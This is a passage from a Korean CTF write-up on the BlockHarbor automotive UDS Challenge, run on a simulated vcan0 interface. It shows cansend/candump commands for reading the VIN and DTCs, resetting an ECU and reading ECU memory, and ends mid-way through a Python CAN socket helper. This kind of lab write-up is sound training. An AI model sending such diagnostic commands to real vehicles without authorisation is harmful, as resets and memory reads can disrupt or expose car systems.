&#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC1A1;&#xC2E0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC55E;&#xC73C;&#xB85C; &#xD480; &#xBB38;&#xC81C;&#xC5D0;&#xC11C; &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xC774;&#xC804;&#xC5D0; &#xC124;&#xBA85;&#xD55C; UDS &#xD3EC;&#xB9F7;&#xC5D0; &#xB9DE;&#xCDB0; SID, DID&#xB97C; &#xC798; &#xAD6C;&#xC131;&#xD558;&#xC5EC; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC1A1;&#xC2E0;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xC751;&#xB2F5; &#xB370;&#xC774;&#xD130;&#xAC00; &#xAE30;&#xBCF8;&#xC801;&#xC778; CAN &#xBA54;&#xC2DC;&#xC9C0; &#xAE38;&#xC774;&#xC778; 8 Byte &#xBCF4;&#xB2E4; &#xD074; &#xACBD;&#xC6B0;&#xB97C; &#xC704;&#xD574;, <code>30000000</code> &#xAC19;&#xC740; Flow Control &#xC694;&#xCCAD;&#xC744; &#xAC19;&#xC774; &#xBCF4;&#xB0B4;&#xC11C; &#xBAA8;&#xB4E0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC218;&#xC2E0; &#xBC1B;&#xB294; &#xBC29;&#xBC95;&#xB3C4; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB807;&#xAC8C; cansend&#xB85C; &#xC804;&#xC1A1;&#xD55C; &#xBA54;&#xC2DC;&#xC9C0;&#xC758; &#xC751;&#xB2F5;&#xC744;, candump&#xB85C; &#xD655;&#xC778;&#xD558;&#xBA70; CAN/UDS &#xD1B5;&#xC2E0; &#xACFC;&#xC815;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="2-Blockharbor-CTF"><a href="#2-Blockharbor-CTF" class="headerlink" title="2. Blockharbor CTF"></a>2. Blockharbor CTF</h2><p><img src="image06.jpg" alt="image06.jpg"></p><p>BlockHarbor CTF&#xB294; &#xC790;&#xB3D9;&#xCC28; &#xC0AC;&#xC774;&#xBC84; &#xBCF4;&#xC548; &#xD68C;&#xC0AC;&#xC778; Block Harbor&#xC5D0;&#xC11C; &#xB9CC;&#xB4E0; Automotive Capture the Flag(CTF) &#xB300;&#xD68C;&#xC785;&#xB2C8;&#xB2E4;. &#xAC00;&#xC0C1; CAN &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4; &#xD658;&#xACBD;&#xACFC; ECU &#xAC04;&#xC758; &#xD1B5;&#xC2E0; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC744; &#xAD6C;&#xC131;&#xD574; &#xB193;&#xC558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xD574;&#xB2F9; &#xB300;&#xD68C; &#xBB38;&#xC81C;&#xB97C; &#xD1B5;&#xD574; CAN/UDS &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xC2B5;&#xC744; &#xD3B8;&#xB9AC;&#xD558;&#xAC8C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xC7A5;&#xC810;&#xC73C;&#xB85C; &#xCC28;&#xB7C9; &#xD574;&#xD0B9; &#xBB38;&#xC81C;&#xB97C; &#xD480; &#xB54C; &#xAC00;&#xC7A5; &#xCD94;&#xCC9C;&#xB418;&#xB294; &#xC0AC;&#xC774;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC0AC;&#xC774;&#xD2B8;&#xB294; &#xD06C;&#xAC8C; 2&#xAC1C;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. CTFd &#xD50C;&#xB7AB;&#xD3FC;&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xB41C; <a href="https://proving-grounds.blockharbor.io/">CTF &#xBB38;&#xC81C; &#xC0AC;&#xC774;&#xD2B8;</a>&#xC640;, &#xCC28;&#xB7C9; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC744; &#xAD6C;&#xCD95;&#xD55C; <a href="https://core.ed.vsec.blockharbor.io/block/learn">VSEC</a> &#xC0AC;&#xC774;&#xD2B8;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; CAN/UDS &#xBC0F; &#xCC28;&#xB7C9;&#xC5D0; &#xB300;&#xD574; &#xCC98;&#xC74C; &#xC811;&#xD55C;&#xB2E4;&#xBA74;, &#xBB38;&#xC81C; &#xC0AC;&#xC774;&#xD2B8;&#xC5D0;&#xC11C; Getting Started &#xBB38;&#xC81C;&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xAC83;&#xC744; &#xAD8C;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image07.png" alt="image07.png"></p><p><a href="https://core.ed.vsec.blockharbor.io/block/learn">VSEC</a>&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xBA74; Other - Learn - SIMULATIONS&#xC5D0;&#xC11C; Proving Grounds&#xC758; &#xC6B0;&#xCE21; &#xD130;&#xBBF8;&#xB110; &#xC544;&#xC774;&#xCF58;&#xC744; &#xD074;&#xB9AD;&#xD558;&#xBA74;, &#xB2E4;&#xC591;&#xD55C; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xCC28;&#xB7C9; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC758; &#xD130;&#xBBF8;&#xB110;&#xC744; &#xC6F9;&#xC73C;&#xB85C; &#xC811;&#xC18D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6B0;&#xB9AC;&#xB294; &#xC774;&#xC911;&#xC5D0;&#xC11C; UDS Challenge &#xBB38;&#xC81C;&#xB4E4;&#xC744; &#xD480; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, UDS Challenge&#xC758; &#xD130;&#xBBF8;&#xB110;&#xC5D0; &#xC811;&#xC18D;&#xD560; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB978; &#xBB38;&#xC81C;&#xB97C; &#xD47C;&#xB2E4;&#xBA74;, &#xB2E4;&#xB978; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD130;&#xBBF8;&#xB110;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xC5EC; &#xBB38;&#xC81C;&#xC5D0; &#xC54C;&#xB9DE;&#xC740; &#xD658;&#xACBD;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="image08.png" alt="image08.png"></p><p>&#xD130;&#xBBF8;&#xB110; &#xC544;&#xC774;&#xCF58;&#xC744; &#xD1B5;&#xD574; &#xC811;&#xC18D;&#xD558;&#xBA74; &#xC704;&#xCC98;&#xB7FC; tmux &#xC258;&#xB85C; &#xC811;&#xC18D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD655;&#xC778;&#xD55C; CTF &#xBB38;&#xC81C;&#xB97C; &#xC774; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xD480;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="2-1-tmux-&#xC124;&#xC815;"><a href="#2-1-tmux-&#xC124;&#xC815;" class="headerlink" title="2.1 tmux &#xC124;&#xC815;"></a>2.1 tmux &#xC124;&#xC815;</h3><p>tmux &#xD130;&#xBBF8;&#xB110; &#xD658;&#xACBD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370; &#xBA87; &#xAC00;&#xC9C0; tmux &#xBA85;&#xB839;&#xC5B4;&#xC640; &#xC124;&#xC815;&#xC744; &#xD1B5;&#xD574;, &#xB354; &#xC88B;&#xC740; &#xBB38;&#xC81C; &#xD480;&#xC774; &#xD658;&#xACBD;&#xC744; &#xAD6C;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; BlockHarbor&#xCE21;&#xC5D0;&#xC11C;&#xB3C4; &#xB79C;&#xB529; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xD1B5;&#xD574; &#xAE30;&#xBCF8;&#xC801;&#xC778; <a href="https://cantreally.cyou/posts/how-i-use-tmux/">tmux &#xC778;&#xD2B8;&#xB85C;</a>&#xB97C; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC911; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xBA87; &#xAC00;&#xC9C0; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image09.png" alt="image09.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># Terminal splitting</span>Ctrl + b%<span class="hljs-comment"># Terminal moving</span>Ctrl + b&#x2190; &#x2192;<span class="hljs-comment"># Terminal scroll</span>Ctrl + b[<span class="hljs-comment"># End scroll</span>Ctrl + c</code></pre><p>&#xC704; &#xBA85;&#xB839;&#xC5B4;&#xC640; &#xC124;&#xC815;&#xB4E4;&#xC774; &#xCCB4;&#xAC10; &#xC0C1; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBA85;&#xB839;&#xC5B4;&#xC785;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xD130;&#xBBF8;&#xB110; &#xBD84;&#xD560;&#xACFC; &#xC774;&#xB3D9;&#xC774; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xC6D0;&#xD558;&#xB294; &#xC124;&#xC815;&#xC774;&#xB098; &#xBA85;&#xB839;&#xC5B4;&#xB294; <a href="https://cantreally.cyou/posts/how-i-use-tmux/">tmux &#xC778;&#xD2B8;&#xB85C;</a>&#xB97C; &#xD655;&#xC778;&#xD558;&#xAC70;&#xB098; &#xAC80;&#xC0C9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="3-UDS-Challenge"><a href="#3-UDS-Challenge" class="headerlink" title="3. UDS Challenge"></a>3. UDS Challenge</h2><p><img src="image10.png" alt="image10.png"></p><p>&#xBB38;&#xC81C; &#xD480;&#xC774;&#xB97C; &#xD560; UDS Challenge&#xB294; UDS &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xBB38;&#xC81C;&#xC5D0;&#xC11C; &#xC694;&#xAD6C;&#xD558;&#xB294; &#xB3D9;&#xC791;&#xC744; &#xC218;&#xD589;&#xD558;&#xACE0;, &#xCC28;&#xB7C9; &#xD658;&#xACBD;&#xC744; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC9C4;&#xD589;&#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB97C; &#xD480; &#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <a href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services#Services">SID</a>&#xC640; <a href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">DID</a>&#xB294; &#xC774;&#xC804;&#xC5D0; &#xC18C;&#xAC1C;&#xD55C; &#xBB38;&#xC11C;&#xB97C; &#xD1B5;&#xD574; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBC14;&#xB85C; &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;!</p><h3 id="3-1-Simulation-VIN"><a href="#3-1-Simulation-VIN" class="headerlink" title="3.1. Simulation VIN"></a>3.1. Simulation VIN</h3><p><img src="image11.png" alt="image11.png"></p><p>&#xC774; &#xBB38;&#xC81C;&#xB294; UDS&#xB97C; &#xD1B5;&#xD574; VIN&#xC744; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p>VIN(Vehicle Identification Number)&#xC740; &#xCC28;&#xB7C9; &#xC2DD;&#xBCC4; &#xBC88;&#xD638;&#xB85C;, &#xC55E;&#xC11C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC124;&#xBA85;&#xD560; &#xB54C; &#xC7A0;&#xAE50; &#xB2E4;&#xB8E8;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC774;&#xAC83;&#xC744; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC870;&#xD68C;&#xD558;&#xBA74; &#xB418;&#xB294; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image12.png" alt="image12.png"></p><p>&#xBA3C;&#xC800; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74;, &#xAC00;&#xC0C1; CAN &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC778; vcan0&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; CAN/UDS &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC1A1;&#xC218;&#xC2E0;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="image13.png" alt="image13.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 03(PCI:len) 22(SID:ReadDataByIdentifier) F190(DID:VIN Data Identifier)</span>cansend vcan0 7DF<span class="hljs-comment">#0322F190 &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre><p>candump&#xB97C; &#xD1B5;&#xD574; &#xBE0C;&#xB85C;&#xB4DC;&#xCE90;&#xC2A4;&#xD2B8; &#xBC0F; ECU1&#xC5D0; &#xB300;&#xD55C; &#xC1A1;&#xC218;&#xC2E0; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574;, 3&#xAC1C;&#xC758; CAN ID&#xB97C; &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xB9C8;&#xC2A4;&#xD0B9; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; VIN DID &#xBC0F; &#xC2DD;&#xBCC4;&#xC790; &#xC77D;&#xAE30; &#xC694;&#xCCAD; SID&#xB97C; &#xACB0;&#xD569;&#xD558;&#xACE0; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;. &#xC751;&#xB2F5;&#xC774; ECU1&#xC5D0;&#xC11C; &#xC624;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; ECU&#xB85C; Flow Control &#xC694;&#xCCAD;&#xAE4C;&#xC9C0; &#xC804;&#xC1A1;&#xD558;&#xBA74; VIN&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xACE0;, flag&#xAE4C;&#xC9C0; &#xD655;&#xC778;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs angelscript">e66fb3f67ac3:~$ candump -a vcan0,<span class="hljs-number">7E0</span>:<span class="hljs-number">7</span>FF,<span class="hljs-number">7E8</span>:<span class="hljs-number">7</span>FF,<span class="hljs-number">7</span>DF:<span class="hljs-number">7</span>FF  vcan0  <span class="hljs-number">7</span>DF   [<span class="hljs-number">4</span>]  <span class="hljs-number">03</span> <span class="hljs-number">22</span> F1 <span class="hljs-number">90</span>               <span class="hljs-string">&apos;.&quot;..&apos;</span>  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">10</span> <span class="hljs-number">14</span> <span class="hljs-number">62</span> F1 <span class="hljs-number">90</span> <span class="hljs-number">66</span> <span class="hljs-number">6</span>C <span class="hljs-number">61</span>   <span class="hljs-string">&apos;..b..fla&apos;</span>  vcan0  <span class="hljs-number">7E0</span>   [<span class="hljs-number">4</span>]  <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>               <span class="hljs-string">&apos;0...&apos;</span>  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">21</span> <span class="hljs-number">67</span> <span class="hljs-number">7</span>B <span class="hljs-number">76</span> <span class="hljs-number">31</span> <span class="hljs-number">6</span>E <span class="hljs-number">5</span>F <span class="hljs-number">42</span>   <span class="hljs-string">&apos;!g{     &apos;</span>  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">22</span> <span class="hljs-number">48</span> <span class="hljs-number">6</span>D <span class="hljs-number">61</span> <span class="hljs-number">63</span> <span class="hljs-number">68</span> <span class="hljs-number">33</span> <span class="hljs-number">7</span>D   <span class="hljs-string">&apos;&quot;      }&apos;</span></code></pre><p>&#xC218;&#xC2E0; &#xBC1B;&#xC740; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC138;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC2DD;&#xBCC4;&#xC790; &#xC77D;&#xAE30; &#xC694;&#xCCAD;(<code>22</code>)&#xC744; &#xD558;&#xB2C8;, &#xC62C;&#xBC14;&#xB978; RSID(<code>62</code>) &#xC751;&#xB2F5;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xB2E4;&#xB7C9;&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC751;&#xB2F5; &#xB418;&#xB294;&#xB370;, &#xD574;&#xB2F9; &#xB370;&#xC774;&#xD130;&#xB4E4; &#xC55E;&#xC5D0;&#xB294; <code>21</code>, <code>22</code>&#xC640; &#xAC19;&#xC740; &#xC5F0;&#xC18D;&#xC801;&#xC778; &#xAC12;&#xC774; &#xD45C;&#xAE30; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC5F0;&#xC18D;&#xC801;&#xC778; &#xB370;&#xC774;&#xD130;&#xC784;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-2-Startup-Message"><a href="#3-2-Startup-Message" class="headerlink" title="3.2. Startup Message"></a>3.2. Startup Message</h3><p><img src="image14.png" alt="image14.png"></p><p>&#xC774; &#xBB38;&#xC81C;&#xB294; ECU restart&#xB294; &#xD558;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xBB3B;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC9C4;&#xB2E8; &#xC815;&#xBCF4;&#xB97C; <code>7DF</code>&#xB85C; &#xBE0C;&#xB85C;&#xB4DC;&#xCE90;&#xC2A4;&#xD2B8; &#xD55C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image15.png" alt="image15.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 02(PCI:len) 11(SID:ECU Reset) 01(SubFunc:Default Session)</span>cansend vcan0 7DF<span class="hljs-comment">#021101</span></code></pre><p>ECU&#xB97C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; Restart&#xB97C; &#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xBC14;&#xB85C; Reset &#xC694;&#xCCAD;(<code>11</code>)&#xC744; &#xBCF4;&#xB0B4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xBB38;&#xC81C;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; Reset &#xC694;&#xCCAD;&#xC758; &#xACBD;&#xC6B0;, &#xAE30;&#xBCF8; &#xC138;&#xC158;(<code>01</code>) Sub Function Byte&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C;&#xBB38;&#xC5D0; &#xBCC4;&#xB3C4;&#xC758; DID&#xB294; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAE30;&#xBCF8; &#xC138;&#xC158;&#xC73C;&#xB85C; ECU Reset &#xC694;&#xCCAD;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xBA74;, &#xD574;&#xB2F9; RSID &#xC751;&#xB2F5;(<code>51</code>)&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC73D;&#xACE0; flag &#xC815;&#xBCF4; &#xB610;&#xD55C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h3 id="3-3-Engine-Trouble"><a href="#3-3-Engine-Trouble" class="headerlink" title="3.3. Engine Trouble?"></a>3.3. Engine Trouble?</h3><p><img src="image16.png" alt="image16.png"></p><p>&#xC774; &#xBB38;&#xC81C;&#xB294; &#xC9C4;&#xB2E8; &#xBB38;&#xC81C; &#xCF54;&#xB4DC;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; DTC&#xB97C; &#xC77D;&#xB294; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. <code>Pxxxx-xx</code>&#xB77C;&#xB294; DTC &#xD3EC;&#xB9F7; &#xD615;&#xC2DD;&#xC5D0; &#xB9DE;&#xCDB0; flag &#xC778;&#xC99D;&#xC744; &#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image17.png" alt="image17.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 03(PCI:len) 19(SID:ReadDTCInformation) 02(SubFunc:DTCStatusMask) 08(confirmedDTC)</span>cansend vcan0 7DF<span class="hljs-comment">#03190208</span></code></pre><p>DTC &#xC815;&#xBCF4; &#xC77D;&#xAE30; &#xC694;&#xCCAD;(<code>19</code>)&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0C1;&#xD0DC; &#xB9C8;&#xC2A4;&#xD06C;&#xB97C; &#xD1B5;&#xD574; DTC &#xC9C4;&#xB2E8; &#xCF54;&#xB4DC;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC138;&#xBD80;&#xC801;&#xC778; DTC Status Byte&#xB294; <a href="https://buly.kr/2UjxlRq">AUTOSAR &#xBB38;&#xC11C;</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD655;&#xC778;&#xB41C; DTC&#xB294; <code>P3E9F-01</code>&#xC785;&#xB2C8;&#xB2E4;. DTC&#xC758; &#xACBD;&#xC6B0; &#xCC28;&#xB7C9; &#xC9C4;&#xB2E8;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; OBD2&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xD574;&#xB2F9;&#xD558;&#xB294; &#xD45C;&#xC900;&#xC778; <a href="https://piembsystech.com/iso-15031-protocol/">ISO 15031</a> &#xBB38;&#xC11C;&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xBA74; DTC &#xCF54;&#xB4DC; &#xD574;&#xC11D;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-4-Secrets-in-Memory"><a href="#3-4-Secrets-in-Memory" class="headerlink" title="3.4. Secrets in Memory?"></a>3.4. Secrets in Memory?</h3><p><img src="image18.png" alt="image18.png"></p><p>&#xC774; &#xBB38;&#xC81C;&#xB294; &#xC8FC;&#xC18C;&#xC5D0; &#xB300;&#xD55C; &#xC77D;&#xAE30; &#xC694;&#xCCAD;&#xC744; &#xC694;&#xAD6C;&#xD558;&#xB294; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. &#xC811;&#xADFC; &#xAC00;&#xB2A5;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC740; <code>0xC3F80000</code>&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD55C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image19.png" alt="image19.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 07(PCI:len) 23(SID:ReadMemoryByAddress) 14(AALFId) C3F83000(addr) FF(255 Byte)</span>cansend vcan0 7DF<span class="hljs-comment">#072314C3F83000FF &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre><p>&#xBA54;&#xBAA8;&#xB9AC; &#xC77D;&#xAE30; &#xC694;&#xCCAD;(<code>23</code>)&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xBA54;&#xBAA8;&#xB9AC; &#xB0B4; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC11C; &#xC8FC;&#xC758;&#xD560; &#xC810;&#xC740; &#xC8FC;&#xC18C;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xAE30; &#xC774;&#xC804;&#xC5D0; AddressAndLengthFormatIdentifier(AALFId)&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xAC12;(<code>14</code>)&#xC744; &#xACC4;&#xC0B0;&#xD574;&#xC11C; &#xC0AC;&#xC6A9;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. AALFId&#xC5D0; &#xB300;&#xD55C; &#xC124;&#xBA85;&#xC740; <a href="https://www.youtube.com/watch?v=s2uC4vWMU7Q&amp;t=104s">&#xD574;&#xB2F9; &#xC601;&#xC0C1;</a>&#xC744; &#xCC38;&#xACE0;&#xD558;&#xBA74; &#xC774;&#xD574;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; 4&#xBC14;&#xC774;&#xD2B8; &#xC8FC;&#xC18C;&#xC640; 1&#xBC14;&#xC774;&#xD2B8; &#xAE38;&#xC774; &#xD3EC;&#xB9F7;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xC694;&#xCCAD;&#xD558;&#xB294; <code>14</code> &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; 255(<code>FF</code>)&#xB9CC;&#xD07C; &#xC77D;&#xAE30; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xBA74; &#xC77D;&#xAE30;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, 